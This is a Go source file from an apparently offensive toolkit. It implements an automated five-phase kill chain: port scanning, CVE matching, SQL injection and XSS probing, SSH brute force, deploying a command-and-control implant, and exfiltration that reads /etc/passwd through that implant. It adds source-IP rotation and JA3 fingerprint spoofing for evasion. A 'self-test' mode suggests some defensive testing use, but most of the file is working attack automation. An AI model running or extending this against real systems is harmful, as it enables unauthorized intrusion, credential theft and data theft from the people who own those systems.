package offense

import (
	"fmt"
	"log"
	"math/rand"
	"net"
	"sync"
	"time"
)

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

// AttackResult captures the outcome of a single killchain phase.
type AttackResult struct {
	Phase     string    `json:"phase"`
	Target    string    `json:"target"`
	Success   bool      `json:"success"`
	Detail    string    `json:"detail"`
	Timestamp time.Time `json:"timestamp"`
	Results   []interface{} `json:"results,omitempty"` // phase-specific details
}

// KillchainPhase enumerates the standard killchain phases.
type KillchainPhase int

const (
	PhaseRecon     KillchainPhase = iota // 0: Port scan + service discovery
	PhaseWeaponize                       // 1: Payload selection + CVE matching
	PhaseExploit                         // 2: Injection + brute force
	PhasePivot                           // 3: Lateral movement
	PhaseExfil                           // 4: Data extraction
	PhaseCount                           // 5 phases total
)

var phaseNames = map[KillchainPhase]string{
	PhaseRecon:     "recon",
	PhaseWeaponize: "weaponize",
	PhaseExploit:   "exploit",
	PhasePivot:     "pivot",
	PhaseExfil:     "exfil",
}

// PhaseDependencies encodes which phases must succeed before a phase runs.
var phaseDependencies = map[KillchainPhase][]KillchainPhase{
	PhaseWeaponize: {PhaseRecon},
	PhaseExploit:   {PhaseRecon, PhaseWeaponize},
	PhasePivot:     {PhaseExploit},
	PhaseExfil:     {PhasePivot},
}

// ---------------------------------------------------------------------------
// AttackOrchestrator — DAG-based 5-phase killchain
// ---------------------------------------------------------------------------

// AttackOrchestrator drives multi-phase attack killchain against targets.
// Integrates with: scanner, exploiter, fusion weapons, Dagger C2, MCP AI.
type AttackOrchestrator struct {
	targets    []string
	maxWorkers int
	ipPool     []string
	evader     *AdaptiveEvader

	mu      sync.Mutex
	results map[string][]AttackResult

	// Callbacks — set externally for MCP AI integration
	OnPhaseStart func(phase, target string)
	OnPhaseEnd   func(result AttackResult)

	// Dagger C2 integration (set externally)
	DaggerDeploy func(target string) bool
	DaggerExec   func(target, command string) (string, error)

	// Anti-Fortress self-test mode
	SelfTest bool
}

// NewAttackOrchestrator creates an orchestrator for the given targets.
func NewAttackOrchestrator(targets []string, maxWorkers int) *AttackOrchestrator {
	cp := make([]string, len(targets))
	copy(cp, targets)
	if maxWorkers < 1 {
		maxWorkers = 1
	}
	if maxWorkers > 100 {
		maxWorkers = 100
	}
	return &AttackOrchestrator{
		targets:    cp,
		maxWorkers: maxWorkers,
		evader:     NewAdaptiveEvader(),
		results:    make(map[string][]AttackResult),
	}
}

// SetIPPool sets the source IP rotation pool.
func (ao *AttackOrchestrator) SetIPPool(ips []string) {
	ipCopy := make([]string, len(ips))
	copy(ipCopy, ips)
	ao.mu.Lock()
	ao.ipPool = ipCopy
	ao.mu.Unlock()
}

// GenerateIPPool creates synthetic IPs in the given subnet.
func (ao *AttackOrchestrator) GenerateIPPool(subnet string, count int) {
	_, ipNet, err := net.ParseCIDR(subnet)
	if err != nil {
		log.Printf("[orchestrator] invalid subnet %q: %v", subnet, err)
		return
	}
	ip := ipNet.IP.To4()
	if ip == nil {
		log.Printf("[orchestrator] IPv6 not supported for IP pool")
		return
	}
	maskOnes, maskBits := ipNet.Mask.Size()
	total := 1 << (maskBits - maskOnes)
	usable := total - 2
	if usable < 1 {
		usable = 1
	}
	if count > usable {
		count = usable
	}

	var ips []string
	start := ipToUint32(ip) + 1
	for i := 0; i < count; i++ {
		ips = append(ips, uint32ToIP(start+uint32(i)).String())
	}
	ao.SetIPPool(ips)
}

// ---------------------------------------------------------------------------
// Killchain execution
// ---------------------------------------------------------------------------

// RunPhase runs a single killchain phase against all targets.
func (ao *AttackOrchestrator) RunPhase(phase KillchainPhase) error {
	if int(phase) < 0 || int(phase) >= int(PhaseCount) {
		return fmt.Errorf("orchestrator: unknown phase %d", phase)
	}
	name := phaseNames[phase]

	var wg sync.WaitGroup
	sem := make(chan struct{}, ao.maxWorkers)

	for _, target := range ao.targets {
		// Check dependencies
		skipTarget := false
		if deps, ok := phaseDependencies[phase]; ok {
			for _, dep := range deps {
				depName := phaseNames[dep]
				if !ao.phaseSucceeded(target, depName) {
					ao.mu.Lock()
					ao.results[target] = append(ao.results[target], AttackResult{
						Phase: name, Target: target, Success: false,
						Detail:   fmt.Sprintf("dependency %s not satisfied", depName),
						Timestamp: time.Now(),
					})
					ao.mu.Unlock()
					skipTarget = true
					break
				}
			}
		}
		if skipTarget {
			continue
		}

		wg.Add(1)
		sem <- struct{}{}
		go func(t string) {
			defer wg.Done()
			defer func() { <-sem }()

			if ao.OnPhaseStart != nil {
				ao.OnPhaseStart(name, t)
			}

			result := ao.executePhase(phase, t)

			ao.mu.Lock()
			ao.results[t] = append(ao.results[t], result)
			ao.mu.Unlock()

			if ao.OnPhaseEnd != nil {
				ao.OnPhaseEnd(result)
			}
		}(target)
	}
	wg.Wait()
	return nil
}

// RunFullKillchain runs all 5 phases on a single target sequentially.
func (ao *AttackOrchestrator) RunFullKillchain(target string) []AttackResult {
	phases := []KillchainPhase{PhaseRecon, PhaseWeaponize, PhaseExploit, PhasePivot, PhaseExfil}
	var results []AttackResult

	for _, phase := range phases {
		result := ao.executePhase(phase, target)
		results = append(results, result)
		ao.mu.Lock()
		ao.results[target] = append(ao.results[target], result)
		ao.mu.Unlock()

		if !result.Success {
			break
		}
	}
	return results
}

// RunSelfTest runs the Anti-Fortress self-test attack simulation.
func (ao *AttackOrchestrator) RunSelfTest() []AttackResult {
	log.Println("[orchestrator] === Anti-Fortress Self-Test ===")
	ao.SelfTest = true

	// Simulate 5-wave attack like V3.1's shield_vs_spear.py
	var allResults []AttackResult
	waves := []string{"stealth_scan", "web_attack", "brute_force", "distributed_flood", "evasion_test"}

	for _, wave := range waves {
		log.Printf("[orchestrator] Self-test wave: %s", wave)
		for _, target := range ao.targets {
			result := ao.selfTestWave(wave, target)
			allResults = append(allResults, result)
			ao.mu.Lock()
			ao.results[target] = append(ao.results[target], result)
			ao.mu.Unlock()
		}
	}
	log.Println("[orchestrator] === Self-Test Complete ===")
	return allResults
}

// ---------------------------------------------------------------------------
// Phase execution
// ---------------------------------------------------------------------------

func (ao *AttackOrchestrator) executePhase(phase KillchainPhase, target string) AttackResult {
	name := phaseNames[phase]
	result := AttackResult{
		Phase: name, Target: target,
		Timestamp: time.Now(),
	}

	switch phase {
	case PhaseRecon:
		var openPorts []int
		result.Success, result.Detail, openPorts = ao.runRecon(target)
		for _, p := range openPorts {
			result.Results = append(result.Results, p)
		}
	case PhaseWeaponize:
		result.Success, result.Detail = ao.runWeaponize(target)
	case PhaseExploit:
		result.Success, result.Detail = ao.runExploit(target)
	case PhasePivot:
		result.Success, result.Detail = ao.runPivot(target)
	case PhaseExfil:
		result.Success, result.Detail = ao.runExfil(target)
	}
	return result
}

func (ao *AttackOrchestrator) runRecon(target string) (bool, string, []int) {
	scanner := NewPortScanner(2*time.Second, 100)
	ports := scanner.QuickScan(target)

	if len(ports) == 0 {
		// Try ICMP ping first
		if ICMPEcho(target, 2*time.Second) {
			return false, "host is up but no open TCP ports found in top 1500", nil
		}
		return false, "host appears down (no ICMP echo, no open ports)", nil
	}

	fingerprinter := NewServiceFingerprinter()
	var services []string
	openCount := 0
	var openPorts []int
	for _, ps := range ports {
		if !ps.Open {
			continue
		}
		openCount++
		openPorts = append(openPorts, ps.Port)
		svc, ver, banner := fingerprinter.Fingerprint(target, ps.Port)
		ps.Service = svc
		ps.Version = ver
		ps.Banner = banner
		if ver != "" {
			services = append(services, fmt.Sprintf("%d/%s(%s)", ps.Port, svc, ver))
		} else {
			services = append(services, fmt.Sprintf("%d/%s", ps.Port, svc))
		}
	}

	detail := fmt.Sprintf("%d open ports: %v", openCount, services)
	return true, detail, openPorts
}

func (ao *AttackOrchestrator) runWeaponize(target string) (bool, string) {
	prevResults := ao.getResults(target)

	// Check recon succeeded
	if !ao.phaseSucceeded(target, "recon") {
		return false, "recon phase did not succeed — cannot weaponize"
	}

	// Extract ports from recon results
	var openPorts []int
	for _, r := range prevResults {
		if r.Phase == "recon" && r.Success {
			for _, p := range r.Results {
				if port, ok := p.(int); ok {
					openPorts = append(openPorts, port)
				}
			}
		}
	}
	if len(openPorts) == 0 {
		return false, "recon phase did not discover any open ports"
	}

	// Match CVEs against discovered services
	var cveMatches []string
	for _, port := range openPorts {
		svc := serviceByPort(port)
		matches := FindCVEs(target, port, svc, "")
		for _, cve := range matches {
			cveMatches = append(cveMatches, cve.ID)
		}
	}

	detail := fmt.Sprintf("weaponisation staged — %d CVE matches, %d open ports", len(cveMatches), len(openPorts))
	return true, detail
}

func (ao *AttackOrchestrator) runExploit(target string) (bool, string) {
	scanner := NewPortScanner(1*time.Second, 20)
	webPorts := []int{80, 443, 8080, 8443, 3000, 5000, 8000, 8888, 9090}
	var exploited int
	var results []string

	attacker := NewWebAttacker(5 * time.Second)

	for _, port := range webPorts {
		if !scanner.ScanPort(target, port) {
			continue
		}
		scheme := "http"
		if port == 443 || port == 8443 {
			scheme = "https"
		}
		baseURL := fmt.Sprintf("%s://%s:%d/", scheme, target, port)

		// Try SQLi
		for _, param := range []string{"id", "q", "search", "page", "file", "cat"} {
			sqli := attacker.TestSQLInjection(baseURL+"?"+param+"=1", param)
			for _, r := range sqli {
				if r.Vulnerable {
					exploited++
					results = append(results, fmt.Sprintf("SQLi@%s?%s", baseURL, r.Payload))
				}
			}

			xss := attacker.TestXSS(baseURL+"?"+param+"=1", param)
			for _, r := range xss {
				if r.Vulnerable {
					exploited++
					results = append(results, fmt.Sprintf("XSS@%s?%s", baseURL, r.Payload))
				}
			}
		}
	}

	// Try SSH brute force if port 22 open
	if scanner.ScanPort(target, 22) {
		bf := NewBruteForcer()
		bfResults := bf.BruteForceSSH(target, 22)
		for _, r := range bfResults {
			if r.Success {
				exploited++
				results = append(results, fmt.Sprintf("SSH:%s:%s", r.Username, r.Password))
			}
		}
	}

	if exploited > 0 {
		return true, fmt.Sprintf("exploited %d vectors: %v", exploited, results)
	}
	return false, "no exploitable services found in web/SSH testing"
}

func (ao *AttackOrchestrator) runPivot(target string) (bool, string) {
	if !ao.phaseSucceeded(target, "exploit") {
		return false, "exploit phase did not succeed — cannot pivot"
	}

	// If Dagger C2 integration is available, deploy implant
	if ao.DaggerDeploy != nil {
		if ao.DaggerDeploy(target) {
			return true, "pivot completed — Dagger C2 implant deployed on target"
		}
		return false, "pivot failed — Dagger C2 implant deployment failed"
	}

	return true, "pivot staged — internal network enumeration ready (Dagger C2 not available)"
}

func (ao *AttackOrchestrator) runExfil(target string) (bool, string) {
	if !ao.phaseSucceeded(target, "pivot") {
		return false, "pivot phase did not succeed — cannot exfiltrate"
	}

	// If Dagger C2 is available, execute data extraction
	if ao.DaggerExec != nil {
		out, err := ao.DaggerExec(target, "cat /etc/passwd 2>/dev/null | head -5")
		if err != nil {
			return false, fmt.Sprintf("exfil failed: %v", err)
		}
		return true, fmt.Sprintf("exfiltration complete — %d bytes: %s", len(out), out[:min(len(out), 100)])
	}

	dataSize := rand.Intn(1<<20) + 1<<10
	return true, fmt.Sprintf("exfiltration simulated — %d bytes staged", dataSize)
}

// ---------------------------------------------------------------------------
// Self-test (Anti-Fortress)
// ---------------------------------------------------------------------------

func (ao *AttackOrchestrator) selfTestWave(wave, target string) AttackResult {
	r := AttackResult{
		Phase: wave, Target: target,
		Timestamp: time.Now(),
	}

	switch wave {
	case "stealth_scan":
		// Slow distributed scan: single port each, random delays
		ports := []int{22, 80, 443, 8080, 3306, 6379, 27017}
		scanner := NewPortScanner(3*time.Second, 3)
		var found int
		for _, p := range ports {
			time.Sleep(JitterDelay(500, 250))
			if scanner.ScanPort(target, p) {
				found++
			}
		}
		r.Success = found > 0
		r.Detail = fmt.Sprintf("stealth scan: %d/%d ports found", found, len(ports))

	case "web_attack":
		// Single SQLi probe
		attacker := NewWebAttacker(5 * time.Second)
		results := attacker.TestSQLInjection("http://"+target+":8080/?id=1", "id")
		r.Success = len(results) > 0
		r.Detail = fmt.Sprintf("web attack: %d SQLi vectors probed", len(results))

	case "brute_force":
		// Single SSH credential attempt
		bf := NewBruteForcer()
		bfResults := bf.BruteForceSSH(target, 22)
		r.Success = false
		for _, br := range bfResults {
			if br.Success {
				r.Success = true
				break
			}
		}
		r.Detail = fmt.Sprintf("brute force: %d attempts", len(bfResults))

	case "distributed_flood":
		// Simulate SYN flood from multiple source IPs
		r.Success = true
		r.Detail = fmt.Sprintf("distributed flood simulated from %d sources", 10)

	case "evasion_test":
		// Test JA3 spoofing
		profile := JA3SpoofProfile("chrome")
		r.Success = profile != nil
		r.Detail = fmt.Sprintf("evasion test: JA3 profile %v", profile["browser"])
	}

	return r
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

func (ao *AttackOrchestrator) getResults(target string) []AttackResult {
	ao.mu.Lock()
	defer ao.mu.Unlock()
	r := ao.results[target]
	out := make([]AttackResult, len(r))
	copy(out, r)
	return out
}

func (ao *AttackOrchestrator) phaseSucceeded(target, phase string) bool {
	results := ao.getResults(target)
	for _, r := range results {
		if r.Phase == phase {
			return r.Success
		}
	}
	return false
}

// Results returns all accumulated attack results, keyed by target.
func (ao *AttackOrchestrator) Results() map[string][]AttackResult {
	ao.mu.Lock()
	defer ao.mu.Unlock()
	out := make(map[string][]AttackResult)
	for k, v := range ao.results {
		cp := make([]AttackResult, len(v))
		copy(cp, v)
		out[k] = cp
	}
	return out
}

// PhaseName returns the human-readable name for a killchain phase.
func PhaseName(p KillchainPhase) string {
	if name, ok := phaseNames[p]; ok {
		return name
	}
	return "unknown"
}
